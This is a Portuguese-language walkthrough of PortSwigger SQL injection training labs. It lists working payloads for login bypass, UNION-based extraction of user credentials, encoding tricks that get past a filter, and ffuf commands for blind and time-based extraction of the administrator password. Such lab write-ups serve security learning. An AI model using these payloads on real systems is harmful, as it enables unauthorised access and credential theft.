---
title: "PortSwigger - SQL Injection"
author: "imendes"
date: 2026-01-18
subject: "PortSwigger Labs Walkthrough"
description: "Write-up técnico dos laboratórios de SQL Injection da PortSwigger"
keywords: ["PortSwigger", "SQL Injection", "SQLi", "Injection", "Web Security"]
lang: pt-BR
titlepage: true
titlepage-color: "483D8B"
titlepage-text-color: "FFFAFA"
titlepage-rule-color: "FFFAFA"
titlepage-rule-height: 2
book: true
classoption: oneside
code-block-font-size: \scriptsize
categories: [PortSwigger]
---

## Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

#### Objetivo: Executar um ataque de SQL injection que faça a aplicação exibir produtos não lançados.

#### Análise inicial

Query SQL executada pela aplicação:

```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

#### Exploração

URL observada: `/filter?category=Corporate+gifts`

**Payload utilizado:**

```
/filter?category=Gifts'+and+released=0--
```

Isso retorna produtos que não estavam disponíveis anteriormente.

-----

## Lab: SQL injection vulnerability allowing login bypass

#### Objetivo: Fazer login como usuário `administrator`.

#### Exploração

**Credenciais utilizadas:**

```
Username: administrator'--
Password: 123
```

Após o login, trocar o email para qualquer email válido.

-----

## Lab: SQL injection with filter bypass via XML encoding
#### Objetivo: Recuperar credenciais do admin através de UNION attack.

#### Análise inicial

Função "Check stock" usa formato XML:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
    <productId>2</productId>
    <storeId>1</storeId>
</stockCheck>
```

#### Descoberta do filtro

Primeiro teste retorna "Attack detected":

```xml
<storeId>1 UNION SELECT username FROM users</storeId>
```

#### Bypass com HTML encoding

**Payload para listar usuários:**

```xml
<storeId>1 &#x55;NION &#x53;ELECT username FROM users</storeId>
```

**Payload para obter senha do admin:**

```xml
<storeId>1 &#x55;NION &#x53;ELECT password from users where username = &#x27;administrator&#x27;</storeId>
```

-----

## Lab: SQL injection attack, querying the database type and version on Oracle

#### Objetivo: Exibir a string da versão do banco de dados.

#### Descoberta da estrutura

Teste inicial: `Accessories'+UNION+SELECT+NULL,NULL+FROM+DUAL--`

#### Exploração

**Payload final:**

```sql
' UNION SELECT 'version',(SELECT LISTAGG(banner, ',') WITHIN GROUP (ORDER BY BANNER) AS merged_version FROM V$VERSION) FROM DUAL
```

-----

## Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft

#### Objetivo: Exibir a string da versão do banco de dados.

#### Exploração

**Payload utilizado:**

```sql
' UNION SELECT NULL,@@version-- 
```

-----

## Lab: SQL injection attack, listing the database contents on non-Oracle databases

#### Objetivo: Fazer login como administrador após descobrir tabelas e colunas.

#### Descoberta de tabelas

```sql
'+UNION+SELECT+TABLE_NAME,TABLE_TYPE+FROM+information_schema.tables+--+
```

**Tabela descoberta:** `users_kzbfto`

#### Descoberta de colunas

```sql
'+UNION+SELECT+COLUMN_NAME,TABLE_NAME+FROM+information_schema.columns+WHERE+table_name+LIKE+'%users%'+--+
```

**Colunas descobertas:**

  - `password_eqbsxn`
  - `username_nuxafg`
  - `email`

#### Extração de dados

```sql
'+UNION+SELECT+username_nuxafg,password_eqbsxn+FROM+users_kzbfto+--+
```

-----

## Lab: SQL injection attack, listing the database contents on Oracle

#### Objetivo: Fazer login como administrador após descobrir tabelas e colunas.

#### Descoberta de tabelas

```sql
'+UNION+SELECT+TABLE_NAME,OWNER+FROM+ALL_TABLES+--
```

**Tabela descoberta:** `USERS_YVJCUK`

#### Descoberta de colunas

```sql
'+UNION+SELECT+TABLE_NAME,COLUMN_NAME+FROM+ALL_TAB_COLUMNS+WHERE+table_name='USERS_YVJCUK'+--
```

**Colunas descobertas:**

  - `PASSWORD_XXJDHT`
  - `USERNAME_GVTUTB`
  - `EMAIL`

#### Extração de dados

```sql
'+UNION+SELECT+USERNAME_GVTUTB,PASSWORD_XXJDHT+FROM+USERS_YVJCUK+--
```

-----

## Lab: SQL injection UNION attack, determining the number of columns returned by the query

#### Objetivo: Determinar quantas colunas são retornadas pela query.

#### Exploração

**Payload utilizado:**

```sql
'+UNION+SELECT+NULL,NULL,NULL+--+
```

-----

## Lab: SQL injection UNION attack, finding a column containing text

#### Objetivo: Identificar coluna compatível com dados string.

#### Exploração

**Payload utilizado:**

```sql
'+UNION+SELECT+NULL,'G4rJj0',NULL+--+
```

-----

## Lab: SQL injection UNION attack, retrieving data from other tables

#### Objetivo: Recuperar todos os usernames e passwords da tabela users.

#### Exploração

**Payload utilizado:**

```sql
'+UNION+SELECT+username,password+FROM+users+--+
```

-----

## Lab: SQL injection UNION attack, retrieving multiple values in a single column

#### Objetivo: Recuperar username e password concatenados em uma única coluna.

#### Descoberta da estrutura

Teste: `+UNION+SELECT+NULL,'NULL'+--+`

#### Exploração

**Payload utilizado:**

```sql
'+UNION+SELECT+NULL,username+||+'~'+||+password+FROM+users+--+
```

-----

## Lab: Blind SQL injection with conditional responses

#### Objetivo: Encontrar senha do administrador via blind injection no cookie.

#### Descoberta do comprimento da senha

```bash
ffuf -w numbers.txt:NUM -u [URL]/filter?category=Accessories \
  -H "Cookie: TrackingId=IPz6m5Xr1aObqMDw'+AND+LENGTH((SELECT+password+FROM+users+WHERE+username='administrator'))='NUM" \
  -mr "Welcome back"
```

**Resultado:** 20 caracteres

#### Extração da senha

```bash
ffuf -w numbers.txt:NUM -w alphanum-case-extra.txt:CHAR -u [URL]/filter?category=Accessories \
  -H "Cookie: TrackingId=IPz6m5Xr1aObqMDw'+AND+SUBSTR((SELECT+password+FROM+users+WHERE+username='administrator'),NUM,1)='CHAR" \
  -mr "Welcome back"
```

-----

## Lab: Blind SQL injection with conditional errors

#### Objetivo: Encontrar senha do administrador via error-based injection.

#### Descoberta do banco Oracle

Teste com `DUAL` confirma Oracle.

#### Extração da senha

```bash
ffuf -w numbers.txt:NUM -w alphanum-case.txt:ALPHA -u [URL]/filter?category=Accessories \
  -H "Cookie: TrackingId=rc7aUZ9ff0NbPku4'+AND+(SELECT+CASE+WHEN+(SUBSTR((SELECT+password+FROM+users+WHERE+username='administrator'),NUM,1)='ALPHA')+THEN+TO_CHAR(1/0)+ELSE+'a'+END+FROM+dual)='a" \
  -mc 500
```

-----

## Lab: Visible error-based SQL injection

#### Objetivo: Vazar senha do administrador através de mensagens de erro.

#### Descoberta da vulnerabilidade

Payload `='` retorna erro detalhado sobre string não terminada.

#### Exploração

**Payload utilizado:**

```sql
TrackingId='%3bSELECT+CAST((SELECT+password+FROM+users+LIMIT+1)+AS+int)--+
```

-----

## Lab: Blind SQL injection with time delays

#### Objetivo: Causar um delay de 10 segundos.

#### Exploração

**Payload PostgreSQL utilizado:**

```sql
;(select 1 from pg_sleep(10))
```

-----

## Lab: Blind SQL injection with time delays and information retrieval

#### Objetivo: Encontrar senha do administrador via time-based injection.

#### Confirmação do banco PostgreSQL

```sql
SELECT pg_sleep(10) --
```

#### Extração da senha (busca binária)

```sql
SELECT CASE WHEN(SUBSTR((SELECT password FROM users WHERE username='administrator'),1,1)='a') THEN pg_sleep(10) ELSE pg_sleep(0) END --
```

**Exemplo de payload final:**

```
TrackingId=dye9liytVe9WXt25'+%3b+SELECT+CASE+WHEN+(SUBSTRING((SELECT+password+FROM+users+WHERE+username='administrator'),20,1)='9')+THEN+pg_sleep(2)+ELSE+pg_sleep(0)+END+--+
```

-----

## Labs 17-18: Blind SQL injection com interação out-of-band
